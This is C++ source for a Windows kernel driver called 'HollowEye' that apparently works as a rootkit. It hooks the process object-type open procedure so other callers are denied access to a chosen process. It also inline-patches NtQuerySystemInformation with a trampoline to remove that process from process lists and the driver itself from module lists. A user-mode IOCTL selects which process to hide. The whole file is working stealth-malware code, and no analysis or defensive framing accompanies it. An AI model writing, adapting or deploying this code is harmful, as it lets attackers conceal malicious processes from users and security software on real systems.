#include <ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#include <windef.h>
#include <intrin.h>
#include "../shared/shared.h"

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
    SystemProcessorPerformanceInformation = 8,
    SystemFlagsInformation = 9,
    SystemCallTimeInformation = 10,
    SystemModuleInformation = 11,
} SYSTEM_INFORMATION_CLASS;

typedef enum _OB_OPEN_REASON {
    ObCreateHandle,
    ObOpenHandle,
    ObDuplicateHandle,
    ObInheritHandle,
    ObMaxOpenReason
} OB_OPEN_REASON;

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
extern "C" VOID DriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS IrpPassthrough(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS IrpDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

extern "C" POBJECT_TYPE* PsProcessType;
extern "C" POBJECT_TYPE* IoDriverObjectType;

typedef NTSTATUS(*OB_OPEN_PROCEDURE)(
    OB_OPEN_REASON OpenReason,
    KPROCESSOR_MODE AccessMode,
    PEPROCESS Process,
    PVOID Object,
    ACCESS_MASK* GrantedAccess,
    ULONG HandleCount);

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

class RkGlobals {
public:
    HANDLE          HiddenPid;
    PVOID           DriverImageBase;
    HANDLE          DriverOwnerPid;

    PVOID*          ProcessOpenProcAddr;
    OB_OPEN_PROCEDURE OriginalProcessOpenProc;
    
    PVOID*          DriverOpenProcAddr;
    OB_OPEN_PROCEDURE OriginalDriverOpenProc;

    PVOID           HookTargetAddr;
    BYTE            OriginalBytes[14];
    PVOID           Trampoline;
    NtQuerySystemInformation_t OriginalQSI;
    KSPIN_LOCK      PatchLock;
    PMDL            HookMdl;

    RkGlobals() {
        HiddenPid = nullptr;
        DriverImageBase = nullptr;
        DriverOwnerPid = nullptr;
        ProcessOpenProcAddr = nullptr;
        OriginalProcessOpenProc = nullptr;
        DriverOpenProcAddr = nullptr;
        OriginalDriverOpenProc = nullptr;
        HookTargetAddr = nullptr;
        Trampoline = nullptr;
        OriginalQSI = nullptr;
        HookMdl = nullptr;
        RtlZeroMemory(OriginalBytes, sizeof(OriginalBytes));
        KeInitializeSpinLock(&PatchLock);
    }
};

RkGlobals g_Rk;

struct VersionOffsets {
    ULONG BuildNumber;
    ULONG TypeInfoOffset;
    ULONG OpenProcOffset;
};

static VersionOffsets g_OffsetTable[] = {
    { 18362, 0x40, 0x38 },
    { 18363, 0x40, 0x38 },
    { 19041, 0x40, 0x38 },
    { 19042, 0x40, 0x38 },
    { 19043, 0x40, 0x38 },
    { 19044, 0x40, 0x38 },
    { 19045, 0x40, 0x38 },
    { 22000, 0x40, 0x38 },
    { 22621, 0x40, 0x38 },
    { 22631, 0x40, 0x38 },
    { 26100, 0x40, 0x38 },
    { 26200, 0x40, 0x38 },
    { 0, 0x40, 0x38 }
};

BOOLEAN GetOffsets(PULONG TypeInfoOffset, PULONG OpenProcOffset) {
    RTL_OSVERSIONINFOEXW ver = { 0 };
    ver.dwOSVersionInfoSize = sizeof(ver);
    
    NTSTATUS status = RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&ver));
    if (!NT_SUCCESS(status)) {
        *TypeInfoOffset = 0x40;
        *OpenProcOffset = 0x38;
        return TRUE;
    }

    ULONG best = 0;
    ULONG bestTypeInfo = 0x40, bestOpenProc = 0x38;
    
    for (int i = 0; g_OffsetTable[i].BuildNumber != 0; i++) {
        if (ver.dwBuildNumber >= g_OffsetTable[i].BuildNumber &&
            g_OffsetTable[i].BuildNumber >= best) {
            best = g_OffsetTable[i].BuildNumber;
            bestTypeInfo = g_OffsetTable[i].TypeInfoOffset;
            bestOpenProc = g_OffsetTable[i].OpenProcOffset;
        }
    }
    
    *TypeInfoOffset = bestTypeInfo;
    *OpenProcOffset = bestOpenProc;
    
    return TRUE;
}

NTSTATUS HookedOpenProcedure(
    OB_OPEN_REASON OpenReason,
    KPROCESSOR_MODE AccessMode,
    PEPROCESS Process,
    PVOID Object,
    ACCESS_MASK* GrantedAccess,
    ULONG HandleCount)
{
    UNREFERENCED_PARAMETER(OpenReason);
    UNREFERENCED_PARAMETER(AccessMode);
    UNREFERENCED_PARAMETER(HandleCount);

    PEPROCESS target = static_cast<PEPROCESS>(Object);
    HANDLE targetPid = PsGetProcessId(target);

    if (targetPid == g_Rk.HiddenPid && g_Rk.HiddenPid != nullptr) {
        HANDLE callerPid = PsGetCurrentProcessId();
        
        if (callerPid != reinterpret_cast<HANDLE>(4) && callerPid != g_Rk.DriverOwnerPid) {
            *GrantedAccess = 0;
            return STATUS_ACCESS_DENIED;
        }
    }

    if (g_Rk.OriginalProcessOpenProc) {
        return g_Rk.OriginalProcessOpenProc(
            OpenReason, AccessMode, Process, Object, GrantedAccess, HandleCount);
    }

    return STATUS_SUCCESS;
}

VOID InstallOpenProcHook() {
    ULONG typeInfoOffset = 0, openProcOffset = 0;
    GetOffsets(&typeInfoOffset, &openProcOffset);

    POBJECT_TYPE procType = *PsProcessType;
    
    PVOID* addr = reinterpret_cast<PVOID*>(
        reinterpret_cast<BYTE*>(procType) + typeInfoOffset + openProcOffset);

    if (*addr == nullptr) {
        g_Rk.ProcessOpenProcAddr = nullptr;
        g_Rk.OriginalProcessOpenProc = nullptr;
        return;
    }

    if (reinterpret_cast<UINT64>(*addr) < 0xFFFF000000000000ULL) {
        g_Rk.ProcessOpenProcAddr = nullptr;
        g_Rk.OriginalProcessOpenProc = nullptr;
        return;
    }

    g_Rk.ProcessOpenProcAddr = addr;
    g_Rk.OriginalProcessOpenProc = static_cast<OB_OPEN_PROCEDURE>(*addr);
    KeMemoryBarrier();

    PVOID hookPtr = reinterpret_cast<PVOID>(HookedOpenProcedure);

    PMDL mdl = IoAllocateMdl(addr, sizeof(PVOID), FALSE, FALSE, nullptr);
    if (!mdl) {
        return;
    }

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        return;
    }

    PVOID mapped = MmMapLockedPagesSpecifyCache(
        mdl,
        KernelMode,
        MmNonCached,
        nullptr,
        FALSE,
        NormalPagePriority);

    if (!mapped) {
        MmUnlockPages(mdl);
        IoFreeMdl(mdl);
        return;
    }

    __try {
        *reinterpret_cast<PVOID*>(mapped) = hookPtr;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }

    MmUnmapLockedPages(mapped, mdl);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
}

VOID RemoveOpenProcHook() {
    if (!g_Rk.ProcessOpenProcAddr || !g_Rk.OriginalProcessOpenProc)
        return;

    PVOID restorePtr = reinterpret_cast<PVOID>(g_Rk.OriginalProcessOpenProc);

    PMDL mdl = IoAllocateMdl(
        g_Rk.ProcessOpenProcAddr, sizeof(PVOID), FALSE, FALSE, nullptr);
    if (!mdl) {
        return;
    }

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        return;
    }

    PVOID mapped = MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmNonCached, nullptr, FALSE, NormalPagePriority);
    if (mapped) {
        __try {
            *reinterpret_cast<PVOID*>(mapped) = restorePtr;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
        MmUnmapLockedPages(mapped, mdl);
    }

    MmUnlockPages(mdl);
    IoFreeMdl(mdl);

    g_Rk.ProcessOpenProcAddr    = nullptr;
    g_Rk.OriginalProcessOpenProc = nullptr;
}

constexpr ULONG PROC_INFO_PID_OFFSET = 0x50;
constexpr ULONG MODULE_ENTRY_SIZE = 0x128;

VOID FilterProcessList(PVOID buffer, ULONG bufferSize) {
    BYTE* base = static_cast<BYTE*>(buffer);
    BYTE* cur  = base;
    BYTE* prev = nullptr;
    ULONG curOffset = 0;

    while (true) {
        if (curOffset >= bufferSize) break;

        ULONG nextOffset = *reinterpret_cast<ULONG*>(cur);
        HANDLE pid = *reinterpret_cast<HANDLE*>(cur + PROC_INFO_PID_OFFSET);

        if (pid == g_Rk.HiddenPid && g_Rk.HiddenPid != nullptr) {
            if (prev == nullptr) {
                if (nextOffset != 0) {
                    ULONG srcOffset = curOffset + nextOffset;
                    if (srcOffset < bufferSize) {
                        ULONG remaining = bufferSize - srcOffset;
                        RtlMoveMemory(cur, base + srcOffset, remaining);
                    }
                } else {
                    *reinterpret_cast<HANDLE*>(cur + PROC_INFO_PID_OFFSET) = nullptr;
                }
            } else {
                if (nextOffset == 0) {
                    *reinterpret_cast<ULONG*>(prev) = 0;
                } else {
                    *reinterpret_cast<ULONG*>(prev) += nextOffset;
                }
            }
            break;
        }

        if (nextOffset == 0) break;
        prev = cur;
        curOffset += nextOffset;
        cur = base + curOffset;
    }
}

VOID FilterModuleList(PVOID buffer) {
    ULONG* count = static_cast<ULONG*>(buffer);
    BYTE* entries = static_cast<BYTE*>(buffer) + sizeof(ULONG);

    for (ULONG i = 0; i < *count; i++) {
        PVOID imageBase = *reinterpret_cast<PVOID*>(entries + (i * MODULE_ENTRY_SIZE) + 0x10);

        if (imageBase == g_Rk.DriverImageBase) {
            ULONG remaining = (*count - i - 1) * MODULE_ENTRY_SIZE;
            if (remaining > 0) {
                RtlMoveMemory(
                    entries + (i * MODULE_ENTRY_SIZE),
                    entries + ((i + 1) * MODULE_ENTRY_SIZE),
                    remaining);
            }
            (*count)--;
            break;
        }
    }
}

NTSTATUS NTAPI HookedNtQSI(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = g_Rk.OriginalQSI(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (!NT_SUCCESS(status) || SystemInformation == nullptr)
        return status;

    __try {
        if (SystemInformationClass == SystemProcessInformation && g_Rk.HiddenPid != nullptr) {
            ULONG actualLength = ReturnLength ? *ReturnLength : SystemInformationLength;
            FilterProcessList(SystemInformation, actualLength);
        }

        if (SystemInformationClass == SystemModuleInformation) {
            FilterModuleList(SystemInformation);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) { }

    return status;
}

VOID InstallQSIHookMDL() {
    UNICODE_STRING fnName;
    RtlInitUnicodeString(&fnName, L"NtQuerySystemInformation");
    
    PVOID fnAddr = MmGetSystemRoutineAddress(&fnName);
    if (!fnAddr) {
        return;
    }

    g_Rk.HookTargetAddr = fnAddr;

    RtlCopyMemory(g_Rk.OriginalBytes, fnAddr, 14);

    g_Rk.Trampoline = ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE, 64, 'yEwH');
    if (!g_Rk.Trampoline) {
        return;
    }

    RtlCopyMemory(g_Rk.Trampoline, fnAddr, 14);

    BYTE* t = static_cast<BYTE*>(g_Rk.Trampoline);
    t[14] = 0xFF; t[15] = 0x25;
    t[16] = 0x00; t[17] = 0x00;
    t[18] = 0x00; t[19] = 0x00;
    *reinterpret_cast<UINT64*>(t + 20) = reinterpret_cast<UINT64>(fnAddr) + 14;

    g_Rk.OriginalQSI = reinterpret_cast<NtQuerySystemInformation_t>(g_Rk.Trampoline);

    BYTE patch[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };
    *reinterpret_cast<UINT64*>(patch + 6) = reinterpret_cast<UINT64>(HookedNtQSI);

    PMDL mdl = IoAllocateMdl(fnAddr, 14, FALSE, FALSE, nullptr);
    if (!mdl) {
        return;
    }

    MmBuildMdlForNonPagedPool(mdl);

    PVOID mapped = MmMapLockedPagesSpecifyCache(
        mdl,
        KernelMode,
        MmNonCached,
        nullptr,
        FALSE,
        NormalPagePriority);

    if (!mapped) {
        IoFreeMdl(mdl);
        return;
    }

    __try {
        RtlCopyMemory(mapped, patch, 14);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        MmUnmapLockedPages(mapped, mdl);
        IoFreeMdl(mdl);
        return;
    }

    MmUnmapLockedPages(mapped, mdl);
    IoFreeMdl(mdl);

    g_Rk.HookMdl = nullptr;
}

VOID RemoveQSIHook() {
    if (!g_Rk.HookTargetAddr)
        return;

    PMDL mdl = IoAllocateMdl(g_Rk.HookTargetAddr, 14, FALSE, FALSE, nullptr);
    if (!mdl) {
        return;
    }

    MmBuildMdlForNonPagedPool(mdl);
    PVOID mapped = MmMapLockedPagesSpecifyCache(
        mdl,
        KernelMode,
        MmNonCached,
        nullptr,
        FALSE,
        NormalPagePriority);

    if (mapped) {
        __try {
            RtlCopyMemory(mapped, g_Rk.OriginalBytes, 14);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
        MmUnmapLockedPages(mapped, mdl);
    }

    IoFreeMdl(mdl);

    if (g_Rk.Trampoline) {
        ExFreePoolWithTag(g_Rk.Trampoline, 'yEwH');
        g_Rk.Trampoline = nullptr;
    }
}

NTSTATUS IrpPassthrough(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS IrpDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID buf = Irp->AssociatedIrp.SystemBuffer;
    ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
        case RK_CTL_HIDE:
            if (inLen >= sizeof(ULONG)) {
                g_Rk.HiddenPid = reinterpret_cast<HANDLE>(
                    static_cast<ULONG_PTR>(*static_cast<ULONG*>(buf)));
            } else {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        case RK_CTL_UNHIDE:
            g_Rk.HiddenPid = nullptr;
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    g_Rk.DriverImageBase = DriverObject->DriverStart;
    g_Rk.DriverOwnerPid = PsGetCurrentProcessId();
    DriverObject->DriverUnload = DriverUnload;

    UNICODE_STRING devName, symLink;
    RtlInitUnicodeString(&devName, L"\\Device\\HollowEye");
    RtlInitUnicodeString(&symLink, L"\\??\\HollowEye");

    PDEVICE_OBJECT devObj = nullptr;
    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &devName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &devObj);

    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(devObj);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpPassthrough;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpPassthrough;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControl;

    __try {
        InstallOpenProcHook();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }

    __try {
        InstallQSIHookMDL();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    return STATUS_SUCCESS;
}

extern "C" VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    __try {
        if (g_Rk.HookTargetAddr)
            RemoveQSIHook();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) { }

    __try {
        if (g_Rk.ProcessOpenProcAddr)
            RemoveOpenProcHook();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) { }

    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, L"\\??\\HollowEye");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
}
